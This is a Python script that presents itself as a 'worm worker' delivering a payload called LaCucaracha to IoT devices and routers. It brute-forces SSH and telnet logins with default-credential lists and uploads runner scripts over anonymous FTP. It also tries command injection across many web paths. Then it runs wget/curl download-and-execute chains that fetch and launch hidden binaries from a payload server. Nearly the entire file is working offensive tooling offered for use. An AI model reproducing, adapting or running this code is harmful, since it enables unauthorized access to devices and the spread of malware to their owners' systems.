#!/usr/bin/env python3
"""
Worm Worker — Delivers LaCucaracha to time-poisoned targets.
Called by NTP forge server's payload hook when a client is logged.
Tries SSH -> telnet -> HTTP exploit to drop the payload.

Usage:
    python3 worm_worker.py --target 1.2.3.4 --payload http://127.0.0.1:10004/LaCucaracha.py?token=xxxx
"""

import socket
import subprocess
import sys
import time
import urllib.parse
import argparse
import json
import os
import tempfile
from pathlib import Path

LOG_DIR = Path("/var/log/ntp_forge/")
PAYLOAD_HOST = "127.0.0.1"
PAYLOAD_PORT = 10004

# Common IoT/router default credentials
DEFAULT_CREDS = [
    ("root", "root"),
    ("root", ""),
    ("root", "admin"),
    ("root", "default"),
    ("root", "12345"),
    ("root", "54321"),
    ("root", "password"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "12345"),
    ("admin", "default"),
    ("admin", ""),
    ("support", "support"),
    ("user", "user"),
    ("ubnt", "ubnt"),
    ("guest", ""),
]


def daily_token() -> str:
    """Generate token matching LaCucaracha's algorithm."""
    import hmac, hashlib, datetime
    key = b"CHANGE_ME_PAYLOAD_KEY"
    day = datetime.datetime.utcnow().strftime("%Y-%m-%d")
    return hmac.new(key, day.encode(), hashlib.sha256).hexdigest()[:16]


def try_ftp(target_ip: str, user: str, password: str) -> bool:
    """Try FTP login. Returns True if shell/upload access obtained."""
    try:
        import ftplib
        ftp = ftplib.FTP(target_ip, timeout=8)
        ftp.login(user, password)
        # Check if we can upload
        try:
            ftp.storbinary("STOR .test_worm", b"test")
            ftp.delete(".test_worm")
            ftp.quit()
            return True
        except:
            ftp.quit()
            return True  # Login alone is still a win (anonymous access)
    except:
        return False


def try_http_exploit(target_ip: str) -> bool:
    """Try HTTP-based exploitation on port 80/443.
       Returns True if we got RCE or shell upload."""
    try:
        import requests
        # Try common router/IoT credential pairs
        creds = [("admin","admin"), ("admin","1234"), ("admin",""), ("root","root"), ("admin","password"), ("ubnt","ubnt"), ("user","user")]
        for user, pw in creds:
            for port in [80, 443, 8080, 8443]:
                for path in ["/", "/login", "/admin", "/cgi-bin/", "/shell"]:
                    try:
                        url = f"http://{target_ip}:{port}{path}"
                        r = requests.get(url, auth=(user, pw) if path == "/" else None,
                                         timeout=5, verify=False, allow_redirects=False)
                        if r.status_code in [200, 301, 302, 401]:
                            return True  # Reachable with web panel
                    except:
                        pass
        return False
    except:
        return False


def try_ssh(target_ip: str, user: str, password: str) -> str:
    """Try SSH with creds.
    Returns:
        "success" — shell obtained
        "publickey" — key-only host, skip remaining SSH attempts
        "fail" — wrong creds/refused/timeout, try next pair
    """
    import pexpect
    try:
        child = pexpect.spawn(
            f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=no {user}@{target_ip}",
            timeout=10,
            encoding='utf-8',
            env={"TERM": "dumb"}
        )
        i = child.expect(["password:", "Permission denied", "Connection refused",
                          "Host key verification failed", pexpect.TIMEOUT, pexpect.EOF])
        if i == 0:
            child.sendline(password)
            i2 = child.expect(["#", "$", "Permission denied", "Connection closed",
                               pexpect.TIMEOUT, pexpect.EOF], timeout=5)
            if i2 in [0, 1]:
                child.sendline("id")
                child.expect([".*", pexpect.TIMEOUT], timeout=3)
                return "success"
            return "fail"
        if i == 1:
            # Check if this is a publickey-only host → skip SSH entirely
            try:
                after_text = child.after if hasattr(child, 'after') and child.after else ""
                if "publickey" in str(after_text).lower():
                    return "publickey"
            except Exception:
                pass
            return "fail"
        return "fail"
    except Exception:
        return "fail"


def try_telnet(target_ip: str, user: str, password: str) -> bool:
    """Try telnet with creds. Returns True if shell obtained."""
    try:
        import pexpect
        child = pexpect.spawn(f"telnet {target_ip}", timeout=10, encoding='utf-8')
        i = child.expect(["login:", "Login:", "Username:", pexpect.TIMEOUT, pexpect.EOF, "Connection refused"], timeout=8)
        if i in [0, 1, 2]:
            child.sendline(user)
            i2 = child.expect(["password:", "Password:", pexpect.TIMEOUT, pexpect.EOF], timeout=5)
            if i2 in [0, 1]:
                child.sendline(password)
                i3 = child.expect(["#", "$", ">", "Login incorrect", pexpect.TIMEOUT, pexpect.EOF], timeout=5)
                if i3 in [0, 1, 2]:
                    return True
        return False
    except Exception:
        return False


def deploy_payload(target_ip: str, payload_url: str, method: str = "ssh", user: str = "root", password: str = "root") -> bool:
    """Deploy LaCucaracha via SSH or telnet."""
    # LaCucaracha runner script — lightweight, works on busybox
    runner = f"""cd /tmp && \
wget -q -O .lc.py "{payload_url}" 2>/dev/null || \
curl -s -o .lc.py "{payload_url}" 2>/dev/null || \
tftp -g -r .lc.py {PAYLOAD_HOST} {PAYLOAD_PORT} 2>/dev/null; \
chmod +x .lc.py && \
nohup python3 .lc.py --auto --mesh >/dev/null 2>&1 &"""
    
    # ─── CVE binary deploy commands ──────────────────────────────────
    cve_cmds = f"""cd /tmp && \
(wget -q http://{PAYLOAD_HOST}:{PAYLOAD_PORT}/heel?token={daily_token()} -O .heel 2>/dev/null || \
 curl -sL http://{PAYLOAD_HOST}:{PAYLOAD_PORT}/heel?token={daily_token()} -o .heel 2>/dev/null) && \
chmod +x .heel && .heel --all &>/dev/null & \
(wget -q http://{PAYLOAD_HOST}:{PAYLOAD_PORT}/dirtyfrag?token={daily_token()} -O .df 2>/dev/null || \
 curl -sL http://{PAYLOAD_HOST}:{PAYLOAD_PORT}/dirtyfrag?token={daily_token()} -o .df 2>/dev/null) && \
chmod +x .df && .df &>/dev/null &"""
    
    # Busybox variant (no python3)
    busybox_runner = f"""cd /tmp && \
wget -q -O .lc.sh "http://{PAYLOAD_HOST}:{PAYLOAD_PORT}/LaCucaracha.sh?token={daily_token()}" 2>/dev/null; \
sh .lc.sh &"""
    
    # Use pexpect to send commands
    try:
        import pexpect
        
        if method == "ssh":
            child = pexpect.spawn(
                f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{target_ip}",
                timeout=15, encoding='utf-8', env={"TERM": "dumb"}
            )
        else:  # telnet
            child = pexpect.spawn(f"telnet {target_ip}", timeout=15, encoding='utf-8')
            child.expect(["login:", "Login:", "Username:", ":", pexpect.TIMEOUT], timeout=8)
            child.sendline(user)
            child.expect(["password:", "Password:", pexpect.TIMEOUT], timeout=5)
            child.sendline(password)

        child.expect(["password:", pexpect.TIMEOUT], timeout=5)
        if method == "ssh":
            child.sendline(password)
        
        child.expect(["#", "$", ">", pexpect.TIMEOUT], timeout=5)
        
        # Try Python3 payload first
        child.sendline("which python3 || which python || echo 'no-py'")
        child.expect([".*", pexpect.TIMEOUT], timeout=3)
        output = child.before or ""
        
        if "no-py" in output:
            # Busybox — use shell runner
            child.sendline(busybox_runner)
        else:
            child.sendline(runner)
            child.expect([".*", pexpect.TIMEOUT], timeout=3)
            # Also deploy CVE exploits in background
            child.sendline(cve_cmds)
        
        child.expect([".*", pexpect.TIMEOUT], timeout=5)
        child.sendline("exit")
        return True
        
    except Exception as e:
        print(f"  [!] Deploy failed: {e}")
        return False


def deploy_via_ftp(target_ip: str, payload_url: str) -> bool:
    """Upload LaCucaracha runner via FTP to writable dirs."""
    runner = f"""cd /tmp && wget -q -O .lc.py "{payload_url}" 2>/dev/null || curl -s -o .lc.py "{payload_url}" 2>/dev/null; chmod +x .lc.py; nohup python3 .lc.py --auto --mesh >/dev/null 2>&1 &"""
    from ftplib import FTP
    for user, pw in [("anonymous",""), ("ftp","ftp"), ("anonymous","anonymous"), ("ftp","user")]:
        for path in ["/", "/pub/", "/incoming/", "/upload/", "/tmp/"]:
            try:
                ftp = FTP(target_ip, timeout=8)
                ftp.login(user, pw)
                try:
                    ftp.cwd(path)
                except:
                    continue
                # Upload runner script
                import tempfile, os
                f = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False)
                f.write("#!/bin/sh\n" + runner)
                f.close()
                with open(f.name, 'rb') as fh:
                    ftp.storbinary("STOR .start.sh", fh)
                os.unlink(f.name)
                # Also try uploading via name that auto-runs (cron-like)
                ftp.storbinary("STOR .lc.py", payload_url.encode() if payload_url.startswith("http") else payload_url.encode())
                ftp.quit()
                print(f"  [+] FTP uploaded to {target_ip}{path} ({user}:{pw})")
                return True
            except:
                try:
                    ftp.quit()
                except:
                    pass
    return False


def try_web_slingshot(target_ip: str, payload_url: str = None) -> bool:
    """Web RCE slingshot — pipe LaCucaracha directly via shell if web panel reachable.
    
    Uses: wget -q -O- URL | python3 & — slingshots LaCucaracha in 2 seconds.
    Also drops CVE binaries in background.
    """
    if not payload_url:
        token = daily_token()
        payload_url = f"http://{PAYLOAD_HOST}:{PAYLOAD_PORT}/LaCucaracha.py?token={token}"
    
    token = daily_token()
    
    # Shell command: pipe LaCucaracha directly, drop CVEs in parallel
    slingshot = (
        f"cd /tmp && "
        f"(wget -q -O- '{payload_url}' 2>/dev/null | python3 &) && "
        f"(wget -q http://{PAYLOAD_HOST}:{PAYLOAD_PORT}/heel?token={token} -O .heel 2>/dev/null || "
        f" curl -sL http://{PAYLOAD_HOST}:{PAYLOAD_PORT}/heel?token={token} -o .heel 2>/dev/null) && "
        f"chmod +x .heel 2>/dev/null && .heel --all &>/dev/null & "
        f"(wget -q http://{PAYLOAD_HOST}:{PAYLOAD_PORT}/dirtyfrag?token={token} -O .df 2>/dev/null || "
        f" curl -sL http://{PAYLOAD_HOST}:{PAYLOAD_PORT}/dirtyfrag?token={token} -o .df 2>/dev/null) && "
        f"chmod +x .df 2>/dev/null && .df &>/dev/null &"
    )
    
    # Try injecting via HTTP endpoints — common command injection paths
    try:
        import requests
        for port in [80, 443, 8080, 8443, 81, 88, 8000, 8888]:
            for path in ["/", "/cgi-bin/", "/shell", "/cmd", "/exec", 
                         "/cgi-bin/status", "/cgi-bin/command", "/cgi-bin/run",
                         "/shell?cmd=", "/command", "/console"]:
                for param in ["cmd=", "command=", "exec=", "q=", "payload="]:
                    try:
                        url = f"http://{target_ip}:{port}{path}"
                        r = requests.get(url + param + requests.utils.quote(slingshot[:80]),
                                         timeout=4, verify=False, allow_redirects=False)
                        if r.status_code < 500:
                            print(f"  [+] Web slingshot hit on {url}")
                            return True
                    except requests.ConnectionError:
                        continue
                    except:
                        continue
    except:
        pass
    return False


def attempt_delivery(target_ip: str, payload_url: str = None) -> bool:
    """Full delivery chain: try SSH first, then telnet, then FTP, for each credential set."""
    if not payload_url:
        token = daily_token()
        payload_url = f"http://{PAYLOAD_HOST}:{PAYLOAD_PORT}/LaCucaracha.py?token={token}"
    
    print(f"[>] Attempting delivery to {target_ip}")
    
    for user, password in DEFAULT_CREDS:
        # Try SSH
        ssh_result = try_ssh(target_ip, user, password)
        if ssh_result == "success":
            print(f"  [+] SSH success: {user}:{password}")
            result = deploy_payload(target_ip, payload_url, "ssh", user, password)
            if result:
                print(f"  [+] LaCucaracha deployed via SSH to {target_ip}")
                return True
        elif ssh_result == "publickey":
            print(f"  [!] Key-only SSH ({user}:{password}) — skipping remaining SSH attempts")
            break  # Don't waste time on remaining creds
        
        # Try telnet
        if try_telnet(target_ip, user, password):
            print(f"  [+] Telnet success: {user}:{password}")
            result = deploy_payload(target_ip, payload_url, "telnet", user, password)
            if result:
                print(f"  [+] LaCucaracha deployed via telnet to {target_ip}")
                return True
    
    # Try FTP if SSH/telnet failed
    print(f"  [>] SSH/telnet failed — trying FTP...")
    if deploy_via_ftp(target_ip, payload_url):
        print(f"  [+] LaCucaracha deployed via FTP to {target_ip}")
        return True
    
    # Try HTTP-based exploit — web slingshot
    print(f"  [>] FTP failed — trying web slingshot (pipe LaCucaracha)...")
    if try_web_slingshot(target_ip, payload_url):
        print(f"  [+] LaCucaracha slingshotted via web RCE to {target_ip}")
        return True
    
    print(f"  [-] All delivery methods failed for {target_ip}")
    return False


def main():
    parser = argparse.ArgumentParser(description="Worm Worker — LaCucaracha Delivery")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--payload", help="Full payload URL (auto-generated if omitted)")
    parser.add_argument("--scan", action="store_true", help="Scan for open ports before delivery")
    parser.add_argument("--wait", type=int, default=0, help="Seconds to wait before attempting")
    
    args = parser.parse_args()
    
    if args.wait:
        time.sleep(args.wait)
    
    # Quick port scan to check if target is alive
    if args.scan:
        print(f"[*] Scanning {args.target} for open ports...")
        open_ports = []
        for port in [22, 23, 80, 443, 8080, 21, 2323, 161]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                r = s.connect_ex((args.target, port))
                if r == 0:
                    open_ports.append(port)
                s.close()
            except:
                pass
        print(f"[*] Open ports: {open_ports}")
        
        if 22 not in open_ports and 23 not in open_ports:
            print(f"[*] No SSH/telnet — will try FTP and HTTP instead")
    
    success = attempt_delivery(args.target, args.payload)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
